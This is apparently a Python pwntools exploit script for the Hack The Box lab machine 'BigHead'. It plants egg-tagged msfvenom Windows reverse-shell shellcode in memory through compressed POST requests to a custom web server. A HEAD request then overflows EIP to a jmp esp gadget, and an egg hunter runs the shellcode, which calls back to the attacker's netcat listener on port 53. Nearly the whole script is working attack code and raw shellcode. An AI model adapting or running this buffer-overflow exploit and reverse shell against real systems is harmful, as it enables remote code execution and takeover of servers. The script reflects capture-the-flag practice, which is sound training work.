#!/usr/bin/env python
# https://www.hackthebox.eu/home/machines/profile/164
# http://docs.pwntools.com/en/stable/
# schex / dualfade

# Attack Flow --
# Attacker (8+ requests) -> LB:80 (nginx proxy)-> BigHeadWebServer:8008 PE 32bit (Custom EXE app)
# nc -4 -lnvp 53 <- BigHeadWebServer (reverse shell) 

# Note: may need to exec script several times...
# Definitely buggy and not stable.

from pwn import *
import zlib

# TARGET
host = "dev.bighead.htb"
port = "80"

# GET requests to be sent 
requests = 8

# SHELLCODE --
# sudo msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.7 LPORT=53 EXITFUNC=thread -f python -b '\x00\x0a\x0d\xcc\x20'
# Payload size: 351 bytes
# Final size of python file: 1684 bytes

buf =  ""
buf += "\xbe\x39\x52\xb2\xeb\xda\xd3\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\x4e\x5c\x50"
buf += "\x1e\x4c\x88\x16\xe1\xac\x49\x77\x6b\x49\x78\xb7\x0f"
buf += "\x1a\x2b\x07\x5b\x4e\xc0\xec\x09\x7a\x53\x80\x85\x8d"
buf += "\xd4\x2f\xf0\xa0\xe5\x1c\xc0\xa3\x65\x5f\x15\x03\x57"
buf += "\x90\x68\x42\x90\xcd\x81\x16\x49\x99\x34\x86\xfe\xd7"
buf += "\x84\x2d\x4c\xf9\x8c\xd2\x05\xf8\xbd\x45\x1d\xa3\x1d"
buf += "\x64\xf2\xdf\x17\x7e\x17\xe5\xee\xf5\xe3\x91\xf0\xdf"
buf += "\x3d\x59\x5e\x1e\xf2\xa8\x9e\x67\x35\x53\xd5\x91\x45"
buf += "\xee\xee\x66\x37\x34\x7a\x7c\x9f\xbf\xdc\x58\x21\x13"
buf += "\xba\x2b\x2d\xd8\xc8\x73\x32\xdf\x1d\x08\x4e\x54\xa0"
buf += "\xde\xc6\x2e\x87\xfa\x83\xf5\xa6\x5b\x6e\x5b\xd6\xbb"
buf += "\xd1\x04\x72\xb0\xfc\x51\x0f\x9b\x68\x95\x22\x23\x69"
buf += "\xb1\x35\x50\x5b\x1e\xee\xfe\xd7\xd7\x28\xf9\x18\xc2"
buf += "\x8d\x95\xe6\xed\xed\xbc\x2c\xb9\xbd\xd6\x85\xc2\x55"
buf += "\x26\x29\x17\xf9\x76\x85\xc8\xba\x26\x65\xb9\x52\x2c"
buf += "\x6a\xe6\x43\x4f\xa0\x8f\xee\xaa\x23\xba\xe4\xb9\x2e"
buf += "\xd2\xfa\xc1\x50\x16\x72\x27\x3a\x48\xd2\xf0\xd3\xf1"
buf += "\x7f\x8a\x42\xfd\x55\xf7\x45\x75\x5a\x08\x0b\x7e\x17"
buf += "\x1a\xfc\x8e\x62\x40\xab\x91\x58\xec\x37\x03\x07\xec"
buf += "\x3e\x38\x90\xbb\x17\x8e\xe9\x29\x8a\xa9\x43\x4f\x57"
buf += "\x2f\xab\xcb\x8c\x8c\x32\xd2\x41\xa8\x10\xc4\x9f\x31"
buf += "\x1d\xb0\x4f\x64\xcb\x6e\x36\xde\xbd\xd8\xe0\x8d\x17"
buf += "\x8c\x75\xfe\xa7\xca\x79\x2b\x5e\x32\xcb\x82\x27\x4d"
buf += "\xe4\x42\xa0\x36\x18\xf3\x4f\xed\x98\x13\xb2\x27\xd5"
buf += "\xbb\x6b\xa2\x54\xa6\x8b\x19\x9a\xdf\x0f\xab\x63\x24"
buf += "\x0f\xde\x66\x60\x97\x33\x1b\xf9\x72\x33\x88\xfa\x56"


# -----------------------------------------------------------
# !mona jmp -r esp --
# Log data, item 7
# Address=62501331
# Message=  0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, 
# Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\BHWS_Backup\bHeadSvr.dll)

# echo "31135062" | xxd -p -u | sed -r 's/(..)/\\x\1/g'
# \x33\x31\x31\x33\x35\x30\x36\x32\x0A
# -----------------------------------------------------------

# @62501331 FFE4 JMP ESP
eip = "\x33\x31\x31\x33\x35\x30\x36\x32\x0A"

# EGG HUNTER --
# !mona egg -pbc "\x00" -t p00f 
# echo "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x70\x30\x30\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" | xxd -p
# echo "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7" | xxd -p -u | sed -r 's/(..)/\\x\1/g'
hunter = "" 
hunter += "\x36\x36\x38\x31\x63\x61\x66\x66\x30\x66\x34\x32\x35\x32\x36\x61"
hunter += "\x30\x32\x35\x38\x63\x64\x32\x65\x33\x63\x30\x35\x35\x61\x37\x34"
hunter += "\x65\x66\x62\x38\x37\x30\x33\x30\x33\x30\x36\x36\x38\x62\x66\x61"
hunter += "\x61\x66\x37\x35\x65\x61\x61\x66\x37\x35\x65\x37\x66\x66\x65\x37"

# -----------------------------------------------------------
# STAGE1 --
# Send normal http POST Request --
# zlib compressed payload into target memory --
# -----------------------------------------------------------
payload = ""
payload += "p00fp00f"
payload += "\x90"*8
payload += buf

stage1 = ""
stage1 += "POST / HTTP/1.1\r\nContent-Encoding: gzip\r\nHost: " + host + ":" + port + "\r\n"
stage1 += "Content-Length: {}\r\n\r\n".format(len(payload)) + zlib.compress(payload) + "\r\n\r\n"

# -----------------------------------------------------------
# STAGE2 --
# Overflow EIP / Spawn Reverse Shell --
# STAGE2: Overflow  / Shellcode --
# "HEAD /coffee" + "\x41"*66 + "\x42"*8 + "\x43"*88
# -----------------------------------------------------------

stage2 = ""
stage2 += "HEAD /coffee" + "\x41"*66 + "\x33\x31\x31\x33\x35\x30\x36\x32"
stage2 += hunter
stage2 += " HTTP/1.1 \r\nHost: " + host + ":" + port + "\r\n\r\n"

# -----------------------------------------------------------
# Send Payload and exploit
# -----------------------------------------------------------

# Load balancer with 8 instances running --
# modify request as needed.
# Egg / Nops / Shellcode into target mem -- 
print "[+] Sending Requests"
print "[+] Sending Egg + Nops + Shellcode\n"
for i in range(requests):
    r = remote(host, port)
    r.send(stage1)
    r.close()

# Overflow / egg hunter / exec rev shell --
print "\n[+] Sending Overflow + Hunter"
r = remote(host, port)
r.send(stage2)
print(r.recvline(timeout=5))
r.close()
print "[+] Spawning reverse shell"
print "[+] Takes a few minutes.."
print "[+] Shell ??\n"

# __EOF __
